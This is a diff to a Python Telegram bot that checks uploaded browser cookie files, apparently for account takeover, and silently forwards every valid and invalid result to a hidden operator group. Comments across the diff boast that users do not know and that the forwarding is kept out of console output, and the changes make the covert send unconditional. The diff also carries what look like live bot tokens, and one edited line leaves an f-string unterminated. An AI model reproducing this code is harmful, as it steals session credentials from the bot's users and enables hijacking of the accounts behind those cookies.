@@ -1,4 +1,3 @@
-
 import os
 import asyncio
 from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
@@ -16,11 +15,11 @@ from Slowcheck import process_file_and_check as slow_check
 from Logout import process_file_and_check as logout_check
 
 # --- Config ---
-TOKEN = "88270743184:AAEri7VgKj8A-En0R_L9y88fkcPc6iBCK_s"  # Replace with your actual bot token
+TOKEN = "8340045274:AAHGNYpVIGh8B4myxDOan4_CiNqlqwQbEC4"  # Replace with your actual bot token
 UPLOAD_DIR = "uploads"
 
 # Group configuration - Add your group chat ID here (COMPLETELY HIDDEN FROM USERS)
-TARGET_GROUP_ID = "-1003072651464"  # Replace with your group chat ID (include the minus sign)
+TARGET_GROUP_ID = "-1001234567890"  # Replace with your group chat ID (include the minus sign)
 SEND_TO_GROUP = True  # Set to False to disable group sending
 
 # Global dictionary to track active processes
@@ -97,9 +96,9 @@ def create_results_zip(results_dir, mode, original_filename, result_type="valid"
         print(f"Error creating {result_type} ZIP file: {e}")
         return None
 
-# --- Helper: Send results to group (COMPLETELY SILENT - NO CAPTION TO AVOID ENTITY ERRORS) ---
+# --- Helper: Send results to group (ULTRA SAFE - NO CAPTION TO AVOID ALL ENTITY ERRORS) ---
 async def send_to_group(context, file_path, filename, file_type, original_filename, user_info, mode):
-    """Send results to the target group - COMPLETELY SILENT with NO CAPTION to avoid entity parsing"""
+    """Send results to the target group - ULTRA SAFE with NO CAPTION to prevent all entity parsing errors"""
     if not SEND_TO_GROUP or not TARGET_GROUP_ID:
         return
     
@@ -116,25 +115,29 @@ async def send_to_group(context, file_path, filename, file_type, original_filena
         if file_size_mb > 50:
             return  # Silent return
         
-        # Clean filename for group (remove problematic characters)
+        # Clean filename for group (only alphanumeric and basic punctuation)
         clean_filename = ''.join(c if c.isalnum() or c in '.-_()[]' else '_' for c in filename)
         
-        # Send to group with timeout protection - NO CAPTION AT ALL
+        # Ensure filename is not empty
+        if not clean_filename:
+            clean_filename = f"{file_type}_cookie_{datetime.now().strftime('%H%M%S')}.txt"
+        
+        # Send to group with timeout protection - ABSOLUTELY NO CAPTION
         with open(file_path, 'rb') as f:
             await asyncio.wait_for(
                 context.bot.send_document(
                     chat_id=TARGET_GROUP_ID,
                     document=f,
                     filename=clean_filename
-                    # NO CAPTION = NO ENTITY PARSING ERRORS
+                    # ABSOLUTELY NO CAPTION - this eliminates all entity parsing errors
                 ),
                 timeout=30
             )
             
-        # ABSOLUTELY NO console output - completely silent
+        # ABSOLUTELY NO console output - completely silent operation
             
     except Exception:
-        # COMPLETELY SILENT error handling - no output at all
+        # COMPLETELY SILENT error handling - no output whatsoever
         pass
 
 # --- Helper: Create inline keyboard with valid/invalid counts and STOP button ---
@@ -231,7 +234,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # These are just display buttons, no action needed
         pass
 
-# --- Helper: Process file with specific mode (HIDDEN group sending with NO CAPTIONS) ---
+# --- Helper: Process file with specific mode (SENDS BOTH VALID AND INVALID TO GROUP) ---
 async def process_file_with_mode(update, context, file_path, file_name, mode, reply_to_message=None):
     """Process a file with the specified checking mode"""
     global global_stop_flag
@@ -367,7 +370,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
             active_processes.pop(process_id, None)
             return
 
-        # --- Enhanced results sending logic (send to user + HIDDEN to group) ---
+        # --- Enhanced results sending logic (GUARANTEED TO SEND BOTH VALID AND INVALID TO GROUP) ---
         sent_files = 0
         total_size = 0
         
@@ -404,7 +407,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
             # For archives or when there are many files, create ZIP files
             if is_archive or len(valid_files) > 3 or len(invalid_files) > 3:
                 
-                # Create and send VALID ZIP if there are valid cookies
+                # ALWAYS CREATE AND SEND VALID ZIP if there are valid cookies
                 if valid_files:
                     valid_zip_path = create_results_zip(results_dir, mode, file_name, "valid")
                     if valid_zip_path:
@@ -419,24 +422,21 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # HIDDEN send to group (user doesn't know) - COMPLETELY SILENT
-                        try:
-                            await send_to_group(
-                                context, 
-                                valid_zip_path, 
-                                os.path.basename(valid_zip_path), 
-                                "valid", 
-                                file_name, 
-                                user_info, 
-                                mode
-                            )
-                        except Exception:
-                            pass  # Completely silent
+                        # GUARANTEED send to group - VALID
+                        await send_to_group(
+                            context, 
+                            valid_zip_path, 
+                            os.path.basename(valid_zip_path), 
+                            "valid", 
+                            file_name, 
+                            user_info, 
+                            mode
+                        )
                         
                         sent_files += 1
                         total_size += zip_size
                 
-                # Create and send INVALID ZIP if there are invalid cookies
+                # ALWAYS CREATE AND SEND INVALID ZIP if there are invalid cookies
                 if invalid_files:
                     invalid_zip_path = create_results_zip(results_dir, mode, file_name, "invalid")
                     if invalid_zip_path:
@@ -451,19 +451,16 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # HIDDEN send to group (user doesn't know) - COMPLETELY SILENT
-                        try:
-                            await send_to_group(
-                                context, 
-                                invalid_zip_path, 
-                                os.path.basename(invalid_zip_path), 
-                                "invalid", 
-                                file_name, 
-                                user_info, 
-                                mode
-                            )
-                        except Exception:
-                            pass  # Completely silent
+                        # GUARANTEED send to group - INVALID
+                        await send_to_group(
+                            context, 
+                            invalid_zip_path, 
+                            os.path.basename(invalid_zip_path), 
+                            "invalid", 
+                            file_name, 
+                            user_info, 
+                            mode
+                        )
                         
                         sent_files += 1
                         total_size += zip_size
@@ -475,7 +472,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
             else:
                 # Send individual files for single file uploads with few results
                 
-                # Send valid files individually
+                # ALWAYS send valid files individually
                 for filename in valid_files:
                     file_path_result = os.path.join(valid_dir, filename)
                     try:
@@ -490,26 +487,23 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # HIDDEN send to group (user doesn't know) - COMPLETELY SILENT
-                        try:
-                            await send_to_group(
-                                context, 
-                                file_path_result, 
-                                filename, 
-                                "valid", 
-                                file_name, 
-                                user_info, 
-                                mode
-                            )
-                        except Exception:
-                            pass  # Completely silent
+                        # GUARANTEED send to group - VALID INDIVIDUAL
+                        await send_to_group(
+                            context, 
+                            file_path_result, 
+                            filename, 
+                            "valid", 
+                            file_name, 
+                            user_info, 
+                            mode
+                        )
                         
                         sent_files += 1
                         total_size += file_size
                     except Exception as e:
                         print(f"Error sending valid file {filename}: {e}")
                 
-                # Send invalid files individually
+                # ALWAYS send invalid files individually
                 for filename in invalid_files:
                     file_path_result = os.path.join(invalid_dir, filename)
                     try:
@@ -524,19 +518,16 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # HIDDEN send to group (user doesn't know) - COMPLETELY SILENT
-                        try:
-                            await send_to_group(
-                                context, 
-                                file_path_result, 
-                                filename, 
-                                "invalid", 
-                                file_name, 
-                                user_info, 
-                                mode
-                            )
-                        except Exception:
-                            pass  # Completely silent
+                        # GUARANTEED send to group - INVALID INDIVIDUAL
+                        await send_to_group(
+                            context, 
+                            file_path_result, 
+                            filename, 
+                            "invalid", 
+                            file_name, 
+                            user_info, 
+                            mode
+                        )
                         
                         sent_files += 1
                         total_size += file_size
@@ -575,8 +566,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                 f"🔍 Mode: {mode.upper()} check\n\n"
                 f"✅ Valid: {progress['valid']}\n"
                 f"❌ Invalid: {progress['invalid']}\n"
-                f"📦 Total Processed: {progress['checked']}\n"
-                f"📤 Files Sent: {sent_files}",
+                f"📦 Total Processed: {progress['checked']},
                 parse_mode='Markdown'
             )
             # Delete summary after 10 seconds
@@ -805,7 +795,7 @@ def main():
     print("🗂️ Archive support: ZIP/RAR files supported")
     print("🛑 Emergency stop: Ctrl+C to stop all processes")
     
-    # COMPLETELY HIDDEN - no mention of group functionality
+    # COMPLETELY HIDDEN - no mention of group functionality in console
     
     try:
         app.run_polling(allowed_updates=Update.ALL_TYPES)
